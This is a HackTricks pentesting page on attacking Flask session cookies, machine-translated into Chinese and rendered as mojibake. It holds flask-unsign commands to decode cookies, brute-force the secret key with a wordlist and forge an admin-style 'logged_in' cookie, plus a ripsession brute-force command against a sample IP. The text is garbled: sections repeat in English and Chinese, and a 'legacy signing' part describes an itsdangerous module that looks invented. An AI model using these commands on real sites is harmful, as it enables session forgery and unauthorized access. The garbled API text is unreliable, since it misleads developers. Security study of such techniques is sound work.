# Flask

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€ä¸ª**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[NFTs](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)æˆ–**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

<figure><img src="../../.gitbook/assets/image (9) (1) (2).png" alt=""><figcaption></figcaption></figure>

ä½¿ç”¨[**Trickest**](https://trickest.io/)å¯ä»¥è½»æ¾æ„å»ºå’Œ**è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œä½¿ç”¨ä¸–ç•Œä¸Š**æœ€å…ˆè¿›çš„**ç¤¾åŒºå·¥å…·ã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

**å¦‚æœä½ åœ¨ç©CTFï¼ŒFlaskåº”ç”¨å¯èƒ½ä¸**[**SSTI**](../../pentesting-web/ssti-server-side-template-injection/)**ç›¸å…³ã€‚**

## Cookies

é»˜è®¤çš„cookieä¼šè¯åç§°æ˜¯**`session`**ã€‚

### è§£ç å™¨

åœ¨çº¿Flask cookieè§£ç å™¨ï¼š[https://www.kirsle.net/wizards/flask-session.cgi](https://www.kirsle.net/wizards/flask-session.cgi)

#### æ‰‹åŠ¨

è·å–cookieçš„ç¬¬ä¸€éƒ¨åˆ†ï¼Œç›´åˆ°ç¬¬ä¸€ä¸ªç‚¹ï¼Œå¹¶å¯¹å…¶è¿›è¡ŒBase64è§£ç >
```bash
echo "ImhlbGxvIg" | base64 -d
```
cookieä¹Ÿä½¿ç”¨å¯†ç è¿›è¡Œç­¾å

### **Flask-Unsign**

å‘½ä»¤è¡Œå·¥å…·ï¼Œé€šè¿‡çŒœæµ‹ç§˜é’¥ï¼Œè·å–ã€è§£ç ã€æš´åŠ›ç ´è§£å’Œæ„é€ Flaskåº”ç”¨ç¨‹åºçš„ä¼šè¯cookieã€‚

{% embed url="https://pypi.org/project/flask-unsign/" %}
```bash
pip3 install flask-unsign
```
#### **è§£ç  Cookie**

To decode a Flask session cookie, you can use the `itsdangerous` library. This library provides a `URLSafeTimedSerializer` class that can be used to decode and encode cookies.

Here is an example of how to decode a Flask session cookie:

```python
from itsdangerous import URLSafeTimedSerializer

def decode_cookie(cookie_value, secret_key):
    serializer = URLSafeTimedSerializer(secret_key)
    try:
        decoded_data = serializer.loads(cookie_value)
        return decoded_data
    except Exception as e:
        print(f"Error decoding cookie: {e}")
        return None
```

In the above code, the `decode_cookie` function takes the cookie value and the secret key as parameters. It creates an instance of the `URLSafeTimedSerializer` class with the secret key. Then, it tries to decode the cookie using the `loads` method of the serializer. If decoding is successful, it returns the decoded data. If an error occurs during decoding, it prints an error message and returns `None`.

Remember to replace `secret_key` with the actual secret key used in your Flask application.

#### **è§£ç  Cookie**

è¦è§£ç  Flask ä¼šè¯ cookieï¼Œå¯ä»¥ä½¿ç”¨ `itsdangerous` åº“ã€‚è¯¥åº“æä¾›äº†ä¸€ä¸ª `URLSafeTimedSerializer` ç±»ï¼Œå¯ç”¨äºè§£ç å’Œç¼–ç  cookieã€‚

ä»¥ä¸‹æ˜¯è§£ç  Flask ä¼šè¯ cookie çš„ç¤ºä¾‹ï¼š

```python
from itsdangerous import URLSafeTimedSerializer

def decode_cookie(cookie_value, secret_key):
    serializer = URLSafeTimedSerializer(secret_key)
    try:
        decoded_data = serializer.loads(cookie_value)
        return decoded_data
    except Exception as e:
        print(f"è§£ç  cookie å‡ºé”™ï¼š{e}")
        return None
```

åœ¨ä¸Šè¿°ä»£ç ä¸­ï¼Œ`decode_cookie` å‡½æ•°æ¥å— cookie å€¼å’Œå¯†é’¥ä½œä¸ºå‚æ•°ã€‚å®ƒä½¿ç”¨å¯†é’¥åˆ›å»º `URLSafeTimedSerializer` ç±»çš„å®ä¾‹ã€‚ç„¶åï¼Œå®ƒå°è¯•ä½¿ç”¨åºåˆ—åŒ–å™¨çš„ `loads` æ–¹æ³•è§£ç  cookieã€‚å¦‚æœè§£ç æˆåŠŸï¼Œå®ƒè¿”å›è§£ç åçš„æ•°æ®ã€‚å¦‚æœåœ¨è§£ç è¿‡ç¨‹ä¸­å‘ç”Ÿé”™è¯¯ï¼Œå®ƒä¼šæ‰“å°é”™è¯¯æ¶ˆæ¯å¹¶è¿”å› `None`ã€‚

è®°å¾—å°† `secret_key` æ›¿æ¢ä¸ºå®é™…åœ¨ Flask åº”ç”¨ä¸­ä½¿ç”¨çš„å¯†é’¥ã€‚
```bash
flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'
```
#### **æš´åŠ›ç ´è§£**

Brute force is a common technique used in hacking to gain unauthorized access to a system or account by systematically trying all possible combinations of passwords until the correct one is found. It is a time-consuming method but can be effective if the password is weak or easily guessable. 

æš´åŠ›ç ´è§£æ˜¯ä¸€ç§å¸¸è§çš„é»‘å®¢æŠ€æœ¯ï¼Œé€šè¿‡ç³»ç»Ÿåœ°å°è¯•æ‰€æœ‰å¯èƒ½çš„å¯†ç ç»„åˆï¼Œç›´åˆ°æ‰¾åˆ°æ­£ç¡®çš„å¯†ç ï¼Œä»è€Œè·å–æœªç»æˆæƒçš„ç³»ç»Ÿæˆ–è´¦æˆ·è®¿é—®æƒé™ã€‚è¿™æ˜¯ä¸€ç§è€—æ—¶çš„æ–¹æ³•ï¼Œä½†å¦‚æœå¯†ç å¼±æˆ–å®¹æ˜“çŒœæµ‹ï¼Œå®ƒå¯ä»¥å–å¾—æ•ˆæœã€‚
```bash
flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie '<cookie>' --no-literal-eval
```
#### **ç­¾å**

Signing is a process used to verify the integrity and authenticity of data. In the context of web applications, signing is often used to ensure that data sent between the client and the server has not been tampered with.

ç­¾åæ˜¯ä¸€ç§ç”¨äºéªŒè¯æ•°æ®å®Œæ•´æ€§å’ŒçœŸå®æ€§çš„è¿‡ç¨‹ã€‚åœ¨Webåº”ç”¨ç¨‹åºçš„ä¸Šä¸‹æ–‡ä¸­ï¼Œç­¾åé€šå¸¸ç”¨äºç¡®ä¿åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´å‘é€çš„æ•°æ®æ²¡æœ‰è¢«ç¯¡æ”¹ã€‚

When signing data, a cryptographic algorithm is used to generate a unique signature for the data. This signature is then attached to the data and sent along with it. On the receiving end, the signature is verified using the same algorithm and a secret key. If the signature matches the data, it means that the data has not been modified since it was signed and that it originated from a trusted source.

åœ¨ç­¾åæ•°æ®æ—¶ï¼Œä½¿ç”¨åŠ å¯†ç®—æ³•ä¸ºæ•°æ®ç”Ÿæˆä¸€ä¸ªå”¯ä¸€çš„ç­¾åã€‚ç„¶åï¼Œå°†æ­¤ç­¾åé™„åŠ åˆ°æ•°æ®å¹¶ä¸å…¶ä¸€èµ·å‘é€ã€‚åœ¨æ¥æ”¶ç«¯ï¼Œä½¿ç”¨ç›¸åŒçš„ç®—æ³•å’Œç§˜å¯†å¯†é’¥éªŒè¯ç­¾åã€‚å¦‚æœç­¾åä¸æ•°æ®åŒ¹é…ï¼Œåˆ™æ„å‘³ç€æ•°æ®è‡ªç­¾åä»¥æ¥æ²¡æœ‰è¢«ä¿®æ”¹ï¼Œå¹¶ä¸”æºè‡ªå¯ä¿¡ä»»çš„æ¥æºã€‚

Flask provides a built-in mechanism for signing data using the `itsdangerous` library. This library allows you to generate secure signatures that can be used to verify the integrity of data.

Flaskæä¾›äº†ä½¿ç”¨`itsdangerous`åº“å¯¹æ•°æ®è¿›è¡Œç­¾åçš„å†…ç½®æœºåˆ¶ã€‚è¯¥åº“å…è®¸æ‚¨ç”Ÿæˆå®‰å…¨çš„ç­¾åï¼Œç”¨äºéªŒè¯æ•°æ®çš„å®Œæ•´æ€§ã€‚

To sign data in Flask, you first need to create a `Signer` object using a secret key. This secret key should be kept confidential, as it is used to generate and verify the signatures.

åœ¨Flaskä¸­å¯¹æ•°æ®è¿›è¡Œç­¾åï¼Œé¦–å…ˆéœ€è¦ä½¿ç”¨ç§˜å¯†å¯†é’¥åˆ›å»ºä¸€ä¸ª`Signer`å¯¹è±¡ã€‚è¿™ä¸ªç§˜å¯†å¯†é’¥åº”è¯¥ä¿å¯†ï¼Œå› ä¸ºå®ƒç”¨äºç”Ÿæˆå’ŒéªŒè¯ç­¾åã€‚

Once you have a `Signer` object, you can use its `sign()` method to generate a signature for your data. This method takes the data as input and returns the signature as a string.

ä¸€æ—¦æœ‰äº†`Signer`å¯¹è±¡ï¼Œå°±å¯ä»¥ä½¿ç”¨å…¶`sign()`æ–¹æ³•ä¸ºæ•°æ®ç”Ÿæˆç­¾åã€‚æ­¤æ–¹æ³•ä»¥æ•°æ®ä½œä¸ºè¾“å…¥ï¼Œå¹¶å°†ç­¾åä½œä¸ºå­—ç¬¦ä¸²è¿”å›ã€‚

To verify a signature, you can use the `Signer` object's `unsign()` method. This method takes the data and the signature as input and returns the original data if the signature is valid. If the signature is invalid or has been tampered with, an exception will be raised.

è¦éªŒè¯ç­¾åï¼Œå¯ä»¥ä½¿ç”¨`Signer`å¯¹è±¡çš„`unsign()`æ–¹æ³•ã€‚æ­¤æ–¹æ³•ä»¥æ•°æ®å’Œç­¾åä½œä¸ºè¾“å…¥ï¼Œå¹¶åœ¨ç­¾åæœ‰æ•ˆæ—¶è¿”å›åŸå§‹æ•°æ®ã€‚å¦‚æœç­¾åæ— æ•ˆæˆ–è¢«ç¯¡æ”¹ï¼Œå°†å¼•å‘å¼‚å¸¸ã€‚

Signing is a useful technique for ensuring the integrity and authenticity of data in web applications. By using signatures, you can detect if data has been modified during transit and verify that it came from a trusted source.

ç­¾åæ˜¯Webåº”ç”¨ç¨‹åºä¸­ç¡®ä¿æ•°æ®å®Œæ•´æ€§å’ŒçœŸå®æ€§çš„æœ‰ç”¨æŠ€æœ¯ã€‚é€šè¿‡ä½¿ç”¨ç­¾åï¼Œæ‚¨å¯ä»¥æ£€æµ‹æ•°æ®åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­æ˜¯å¦è¢«ä¿®æ”¹ï¼Œå¹¶éªŒè¯å…¶æ¥è‡ªå¯ä¿¡ä»»çš„æ¥æºã€‚
```bash
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME'
```
#### ä½¿ç”¨ä¼ ç»Ÿæ–¹å¼è¿›è¡Œç­¾åï¼ˆæ—§ç‰ˆæœ¬ï¼‰

In older versions of Flask, the `signing` module was used to sign data. This module provides a way to ensure the integrity and authenticity of data by appending a cryptographic signature to it.

To sign data using the legacy method, you can follow these steps:

1. Import the `signing` module from the `itsdangerous` package:

```python
from itsdangerous import signing
```

2. Create an instance of the `signing.Signer` class, passing a secret key as a parameter:

```python
signer = signing.Signer('your_secret_key')
```

3. Use the `signer.sign()` method to sign the data:

```python
signed_data = signer.sign('your_data')
```

4. To verify the signature, you can use the `signer.unsign()` method:

```python
original_data = signer.unsign(signed_data)
```

Note that this method of signing data is considered legacy and is not recommended for use in newer versions of Flask. It is recommended to use the `itsdangerous` module's `URLSafeTimedSerializer` class for signing data in the latest versions of Flask.
```bash
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME' --legacy
```
### **RIPsession**

å‘½ä»¤è¡Œå·¥å…·ï¼Œä½¿ç”¨ä½¿ç”¨flask-unsignç”Ÿæˆçš„cookieå¯¹ç½‘ç«™è¿›è¡Œæš´åŠ›ç ´è§£ã€‚

{% embed url="https://github.com/Tagvi/ripsession" %}
```bash
ripsession -u 10.10.11.100 -c "{'logged_in': True, 'username': 'changeMe'}" -s password123 -f "user doesn't exist" -w wordlist.txt
```
### ä½¿ç”¨SQLmapåœ¨Flaskä¼šè¯cookieä¸­è¿›è¡ŒSQLiæ”»å‡»

[**è¿™ä¸ªç¤ºä¾‹**](../../pentesting-web/sql-injection/sqlmap/#eval) ä½¿ç”¨sqlmapçš„`eval`é€‰é¡¹æ¥ä½¿ç”¨å·²çŸ¥çš„å¯†é’¥è‡ªåŠ¨ç­¾åflaskçš„sqlmapè´Ÿè½½ã€‚

<figure><img src="../../.gitbook/assets/image (9) (1) (2).png" alt=""><figcaption></figcaption></figure>

ä½¿ç”¨[**Trickest**](https://trickest.io/)è½»æ¾æ„å»ºå’Œè‡ªåŠ¨åŒ–ç”±å…¨çƒ**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒçš„å·¥ä½œæµç¨‹ã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
